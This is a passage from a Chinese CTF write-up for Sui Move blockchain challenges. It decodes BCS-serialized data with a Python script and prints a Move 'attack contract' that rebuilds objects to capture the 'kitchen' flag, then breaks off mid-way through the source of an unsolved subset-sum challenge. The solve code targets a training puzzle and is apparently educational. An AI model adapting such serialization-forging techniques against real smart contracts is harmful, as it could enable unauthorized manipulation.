+</span></span><span style="display:flex;"><span>    salt: <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Cook</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> has copy, drop, store {
+</span></span><span style="display:flex;"><span>    source: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Pizza中的olive_oils实际上是一个16位整数的数组，外面套了两层结构体。由于bcs的序列化格式，Pizza的序列化数据为：</p>
+<table>
+<thead>
+<tr>
+<th>数组长度</th>
+<th>数据</th>
+<th>数组长度</th>
+<th>数据</th>
+<th>&hellip;.</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x4</td>
+<td>0x1 0x2 0x3 0x4</td>
+<td>0x3</td>
+<td>0x1 0x2 0x3</td>
+<td>&hellip;.</td>
+</tr>
+</tbody>
+</table>
+<p>使用以下python脚本解析：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1&#39;</span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>bytes_s <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> len(data) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>    bytes_s<span style="color:#f92672">.</span>append(int(<span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> data[i] <span style="color:#f92672">+</span> data[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>))
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> i <span style="color:#f92672">&lt;</span> len(bytes_s):
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> bytes_s[i]
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> o <span style="color:#f92672">in</span> range(p):
+</span></span><span style="display:flex;"><span>        l<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(bytes_s[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;0x&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> hex(bytes_s[i])<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;0x&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    res<span style="color:#f92672">.</span>append(l)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(res)
+</span></span></code></pre></div><p>可能是因为反码补码那一套东西，我发现2字节的数字（16位）需要倒换一下才行。   <br>
+通过得到的数据生成对象即可。</p>
+<h4 id="recook函数">recook函数：<a hidden class="anchor" aria-hidden="true" href="#recook函数">#</a></h4>
+<p>recook函数就简单许多了。
+已经把数据都写出来了，直接生成序列化数据传参即可。</p>
+<h4 id="攻击合约-2">攻击合约<a hidden class="anchor" aria-hidden="true" href="#攻击合约-2">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module zoiltin_solve_kitchen::exp{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context::{TxContext};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::bcs;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::event;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> std::vector;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> kitchen::kitchen::{Self,Olive_oil,Yeast,Flour,Salt};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Poil</span> has drop{
+</span></span><span style="display:flex;"><span>        p1:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>        p2:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>        p3:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span>        p4:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Message</span> has drop,copy{
+</span></span><span style="display:flex;"><span>        mass:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u8</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public entry fun exp(ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> TxContext) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> obj1 <span style="color:#f92672">=</span> Poil{
+</span></span><span style="display:flex;"><span>            p1:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">0xa515</span>,<span style="color:#ae81ff">0xa6b8</span>,<span style="color:#ae81ff">0xc9f8</span>,<span style="color:#ae81ff">0xbb46</span>],
+</span></span><span style="display:flex;"><span>            p2:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">0xbd00</span>,<span style="color:#ae81ff">0x999d</span>,<span style="color:#ae81ff">0xb77e</span>],
+</span></span><span style="display:flex;"><span>            p3:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">0xd78a</span>,<span style="color:#ae81ff">0xfa84</span>,<span style="color:#ae81ff">0xb8f2</span>],
+</span></span><span style="display:flex;"><span>            p4:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">0xf1c5</span>,<span style="color:#ae81ff">0xe122</span>]
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// cook需要的相应数据。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> statu <span style="color:#f92672">=</span> kitchen::get_status(ctx);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> l4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook1 <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span>Olive_oil<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook2 <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span>Yeast<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook3 <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span>Flour<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> cook4 <span style="color:#f92672">=</span> vector::empty<span style="color:#f92672">&lt;</span>Salt<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 通过数据生成所需的对象。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l1) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook1, kitchen::get_Olive_oil((<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>obj1.p1, i) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>)));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l2) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook2, kitchen::get_Yeast((<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>obj1.p2, i) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>)));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l3) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook3, kitchen::get_Flour((<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>obj1.p3, i) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>)));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> l4) {
+</span></span><span style="display:flex;"><span>            vector::push_back(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> cook4, kitchen::get_Salt((<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>obj1.p4, i) <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">u16</span>)));
+</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// event::emit( Message{
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//     mass: bcs::to_bytes(&amp;obj1)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// } );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// assert!( bcs::to_bytes(&amp;obj1) == x&#34;04a515a6b8c9f8bb4603bd00999db77e03d78afa84b8f202f1c5e122&#34;, 999);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        kitchen::cook(cook1,cook2,cook3,cook4,<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> statu);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> obj2 <span style="color:#f92672">=</span> Poil{
+</span></span><span style="display:flex;"><span>            p1:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xb9d9</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xeb54</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x9268</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xc5f7</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xa1ec</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xd084</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            p2:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xbd00</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xfc81</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x999d</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xb77e</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            p3:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xdcc7</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xcc7a</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x8f19</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x96b1</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x8a6d</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            p4:<span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">u16</span><span style="color:#f92672">&gt;</span>[
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0x8b01</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xf1c5</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xc6ec</span>
+</span></span><span style="display:flex;"><span>            ]
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 这里通过自定义的Poil结构生成序列化字节，因为bcs特点，只要他们在内存中存储格式一样，无论结构体名或嵌套了几层都无所谓。最后生成的序列化字节都是一样的。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        kitchen::recook(bcs::to_bytes(<span style="color:#f92672">&amp;</span>obj2),<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">mut</span> statu);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        kitchen::get_flag(<span style="color:#f92672">&amp;</span>statu,ctx);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>网上关于bcs的资料很少，搜到的bcs的第三方解析库也都不能成功解析，不过还好题目的数据不算复杂，自己写的脚本也能用。</p>
+<h3 id="subset">subset<a hidden class="anchor" aria-hidden="true" href="#subset">#</a></h3>
+<blockquote>
+<p>sorce: 400    (未解决)</p>
+</blockquote>
+<p>题目源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>module subset::subset_sum {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::event;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> sui::tx_context;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">use</span> std::vector;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Flag</span> has copy, drop {
+</span></span><span style="display:flex;"><span>        user: <span style="color:#a6e22e">address</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Status</span> has store, drop {
+</span></span><span style="display:flex;"><span>        status1: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>        status2: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>        status3: <span style="color:#66d9ef">bool</span>,
+</span></span><span style="display:flex;"><span>        user: <span style="color:#a6e22e">address</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET1</span>: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> vector<span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> SUBSET1_k: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET1_SUM</span>: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET2</span>: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> vector<span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">657114161599166</span>, <span style="color:#ae81ff">910496114410022</span>, <span style="color:#ae81ff">688072175280628</span>, <span style="color:#ae81ff">979125688929861</span>, <span style="color:#ae81ff">785338725553848</span>, <span style="color:#ae81ff">887159728265050</span>, <span style="color:#ae81ff">622841641193103</span>, <span style="color:#ae81ff">725154659875148</span>, <span style="color:#ae81ff">740423950361799</span>, <span style="color:#ae81ff">1112663190822550</span>, <span style="color:#ae81ff">922195312967936</span>, <span style="color:#ae81ff">1042436852643560</span>, <span style="color:#ae81ff">794233930466363</span>, <span style="color:#ae81ff">1005209504277475</span>, <span style="color:#ae81ff">1095553790921575</span>, <span style="color:#ae81ff">1100234031975913</span>, <span style="color:#ae81ff">1097338706315892</span>, <span style="color:#ae81ff">685173186787942</span>, <span style="color:#ae81ff">931084447948631</span>, <span style="color:#ae81ff">1025208692464347</span>, <span style="color:#ae81ff">823246835986875</span>, <span style="color:#ae81ff">640705587553065</span>, <span style="color:#ae81ff">1067772094848338</span>, <span style="color:#ae81ff">608307547370178</span>, <span style="color:#ae81ff">860527574463312</span>, <span style="color:#ae81ff">745522896700102</span>, <span style="color:#ae81ff">1107646656429468</span>, <span style="color:#ae81ff">575719789023353</span>, <span style="color:#ae81ff">1008988042757401</span>, <span style="color:#ae81ff">563072788255737</span>, <span style="color:#ae81ff">882855688862943</span>, <span style="color:#ae81ff">974319745991702</span>, <span style="color:#ae81ff">1004427379286462</span>, <span style="color:#ae81ff">904504413493231</span>, <span style="color:#ae81ff">1083652042079152</span>, <span style="color:#ae81ff">1053694822809090</span>, <span style="color:#ae81ff">702717128907262</span>, <span style="color:#ae81ff">881540236795119</span>, <span style="color:#ae81ff">992204188883575</span>, <span style="color:#ae81ff">890965906483327</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> SUBSET2_k: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET2_SUM</span>: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">4178919802453692</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET3</span>: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> vector<span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>[<span style="color:#ae81ff">730983191275949878802706287425</span>, <span style="color:#ae81ff">738747747182330870358722868390</span>, <span style="color:#ae81ff">680758618870742741205069880873</span>, <span style="color:#ae81ff">736839950200009681117675478653</span>, <span style="color:#ae81ff">821817898783913524938769447793</span>, <span style="color:#ae81ff">1062662929594640521216588473346</span>, <span style="color:#ae81ff">804078432654564652353003934418</span>, <span style="color:#ae81ff">987354119502628442223858924307</span>, <span style="color:#ae81ff">974121064863569224403070119631</span>, <span style="color:#ae81ff">766517359152261667697388282513</span>, <span style="color:#ae81ff">1115664590742545309936719501477</span>, <span style="color:#ae81ff">1254953696369781959586392455121</span>, <span style="color:#ae81ff">708965201854329468418120106125</span>, <span style="color:#ae81ff">803407590419087414384275360152</span>, <span style="color:#ae81ff">680994772249007776444211943134</span>, <span style="color:#ae81ff">1209641410992728376967530103489</span>, <span style="color:#ae81ff">1022807828605992586908433214193</span>, <span style="color:#ae81ff">708760513774702586605766399361</span>, <span style="color:#ae81ff">1146510154260900723919247238072</span>, <span style="color:#ae81ff">1071639493717448858831225830703</span>, <span style="color:#ae81ff">704595551001390485227577881300</span>, <span style="color:#ae81ff">666267842956106233584633761922</span>, <span style="color:#ae81ff">916484600070887410197321230180</span>, <span style="color:#ae81ff">869547011380359879465486127051</span>, <span style="color:#ae81ff">1146284238922586539801525899580</span>, <span style="color:#ae81ff">960791406315307372223215677265</span>, <span style="color:#ae81ff">846714517434965788941098273736</span>, <span style="color:#ae81ff">943109174072029103168835446476</span>, <span style="color:#ae81ff">1186748483275224241752870865835</span>, <span style="color:#ae81ff">810729587696497173434925395865</span>, <span style="color:#ae81ff">1081140748486010470135469081647</span>, <span style="color:#ae81ff">1117896979087650487375387404086</span>, <span style="color:#ae81ff">815335940196924955981808193550</span>, <span style="color:#ae81ff">980088874723074134145795909695</span>, <span style="color:#ae81ff">1040350471929604504671667297293</span>, <span style="color:#ae81ff">694306413856033832104987821225</span>, <span style="color:#ae81ff">1100701148915109260220219397362</span>, <span style="color:#ae81ff">861206885233154419043148976517</span>, <span style="color:#ae81ff">876554683816312162465230697586</span>, <span style="color:#ae81ff">1076923686440478606439365136720</span>, <span style="color:#ae81ff">1107602068170190810465822909560</span>, <span style="color:#ae81ff">1100902219684950305811682891430</span>, <span style="color:#ae81ff">1009332208289062882998661101012</span>, <span style="color:#ae81ff">967609782575367058780528699819</span>, <span style="color:#ae81ff">847083579140405861838133952519</span>, <span style="color:#ae81ff">960959937086001625649028920079</span>, <span style="color:#ae81ff">705904760596273528708773247739</span>, <span style="color:#ae81ff">988488072940508411593301577206</span>, <span style="color:#ae81ff">855813607361058850034718734435</span>, <span style="color:#ae81ff">923433147009426548286155351544</span>, <span style="color:#ae81ff">927267999331166226154541562801</span>, <span style="color:#ae81ff">833421857490492247367663980146</span>, <span style="color:#ae81ff">913726313126985248790906682414</span>, <span style="color:#ae81ff">1152739002690744639089937932044</span>, <span style="color:#ae81ff">758241923243582267541395815418</span>, <span style="color:#ae81ff">826183630101084916296521382931</span>, <span style="color:#ae81ff">871183653161711616458012031543</span>, <span style="color:#ae81ff">1118876419859306653014740242503</span>, <span style="color:#ae81ff">925209067093127804911661688602</span>, <span style="color:#ae81ff">796047972746266882548343051358</span>, <span style="color:#ae81ff">1105317347573296959936900839504</span>, <span style="color:#ae81ff">1032520332923337088078820581073</span>, <span style="color:#ae81ff">790503191621237284611596729403</span>, <span style="color:#ae81ff">1093888060891270134787133219999</span>, <span style="color:#ae81ff">1129244151204837429536515955111</span>, <span style="color:#ae81ff">736340764546413369555890340882</span>, <span style="color:#ae81ff">844331877762673816004189096610</span>, <span style="color:#ae81ff">1216403448409604941009786692773</span>, <span style="color:#ae81ff">1026707098397380044704009977063</span>, <span style="color:#ae81ff">1162146257113640418035057534747</span>, <span style="color:#ae81ff">1239108677717284719224289951413</span>, <span style="color:#ae81ff">1179642728157883101738427519029</span>, <span style="color:#ae81ff">1121726694197132350252978011382</span>, <span style="color:#ae81ff">1166236995314127503915531123371</span>, <span style="color:#ae81ff">1237380820841327126465021125310</span>, <span style="color:#ae81ff">928563984604088646801945637827</span>, <span style="color:#ae81ff">969172329973162874760566309613</span>, <span style="color:#ae81ff">916791337778690807774047076043</span>, <span style="color:#ae81ff">1187392146940862931565053344747</span>, <span style="color:#ae81ff">1041354841046252194695344517944</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> SUBSET3_k: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">SUBSET3_SUM</span>: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">9639405868465735216305592265916</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    public fun get_status(ctx: <span style="color:#66d9ef">&amp;</span><span style="color:#a6e22e">mut</span> tx_context::TxContext): <span style="color:#a6e22e">Status</span> {
+</span></span><span style="display:flex;"><span>        Status {
+</span></span><span style="display:flex;"><span>            status1: <span style="color:#a6e22e">false</span>,
+</span></span><span style="display:flex;"><span>            status2: <span style="color:#a6e22e">false</span>,
+</span></span><span style="display:flex;"><span>            status3: <span style="color:#a6e22e">false</span>,
+</span></span><span style="display:flex;"><span>            user: <span style="color:#a6e22e">tx_context</span>::sender(ctx)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    public fun check_params(vec: <span style="color:#a6e22e">vector</span><span style="color:#f92672">&lt;</span>u256<span style="color:#f92672">&gt;</span>, k: <span style="color:#a6e22e">u256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> sum: <span style="color:#a6e22e">u256</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span>(i <span style="color:#f92672">&lt;</span> vector::length(<span style="color:#f92672">&amp;</span>vec)) {
+</span></span><span style="display:flex;"><span>            assert!(<span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">=</span> sum <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>vector::borrow(<span style="color:#f92672">&amp;</span>vec, i);
